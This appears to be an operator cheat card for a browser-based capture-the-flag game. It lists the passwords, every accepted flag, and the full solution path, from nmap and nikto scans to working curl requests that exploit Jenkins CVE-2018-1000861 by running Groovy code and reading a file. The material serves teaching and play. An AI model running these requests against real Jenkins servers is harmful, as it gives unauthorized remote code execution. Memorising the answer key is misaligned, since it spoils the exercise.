# m0usunet-ctf — operator cheat card

Use this to play through the whole flow end-to-end. Not shipped to
the v86 image — repo-local only.

## Boot

Open: `https://jackgrauer.github.io/m0usunet-ctf/?bust=<anything>`

Bump `bust=` to force a cache-fresh fetch when iterating.

## Passwords

All four portal gates accept the same code (intentionally — the IRL
event hands them out, the digital prototype just uses one).

```
PASSWORD1: 4123
PASSWORD2: 4123
PASSWORD3: 4123    (also revealed in-game inside phase3-done banner)
PASSWORD4: 4123
```

## TASK 2 — Operation Parmesan Rose (the digital phase)

You're dropped into the m0usunet shell at `/mnt/kit/01_nmap`.
There are three phases inside.

### Phase 1 — nmap (find the back-office host)

```
nmap 10.4.12.0/24            # base sweep, 12 hosts
nmap -sV 10.4.12.0/24        # adds VERSION column
```

Look for the host with an **extra `rDNS record for ...` line** under
its scan-report header. Only one has it.

Answer: 10.4.12.88. Any of these submissions work:

```
apply m0use{10.4.12.88}
apply m0use{jenkins-old}
apply m0use{jenkins-old.internal.crazy.ants}
apply m0use{legacy-build-03}
apply m0use{legacy-build-03.crazy.ants}
apply m0use{10.4.12.88:8080}
apply m0use{10.4.12.1:8080}
```

### Phase 2 — nikto (fingerprint + CVE lookup)

```
cd /mnt/kit/02_nikto
nikto -h http://10.4.12.1:8080/
cat advisories
```

nikto reports `x-jenkins: 2.121.1`. In `advisories`, find the entry
matching that version that is **UNAUTH RCE** (everything else is
authenticated, info disclosure, or XSS). Answer:

```
apply m0use{CVE-2018-1000861}
```

Variants also accepted: `CVE_2018_1000861`, lowercase, or
`descriptorByName_unauth`.

### Phase 3 — curl (exploit + read blueprint)

```
cd /mnt/kit/03_metasploit
cat README
```

Sanity check the unauth Groovy eval works:

```
curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=println(42)'
```

Expect: `Result: 42`.

Read the blueprint:

```
curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=new%20File(%22/var/m0use/blueprint.txt%22).text'
```

The flag is in the response:

```
apply m0use{jenkins_was_a_mistake}
```

Then type `continue` (alias for `exit`) to leave the game subshell
and return to the portal.

## TASK 4 — reflection

Four sections; press ENTER on a blank line to advance each:

```
WHEN YOU  → anything
I FEEL    → anything
I NEED    → anything
WOULD YOU → anything
```

## In-shell helpers

```
help              # one-page command reference
cat hint          # current phase's non-judgmental hint
cat README        # current phase's long-form notes
ls / ll / cd      # navigate the kit
restart           # nuke portal state, re-enter from cold-open
continue          # leave the m0usunet game shell (alias for exit)
```

## Local dry-run (no v86, no browser)

```
./build/dryrun.sh
```

Runs the portal flow against a tmpdir for state. Game subshell is
skipped unless `PORTAL_SKIP_GAME=` is unset and you point `PORTAL_RC`
at a real game-rc.
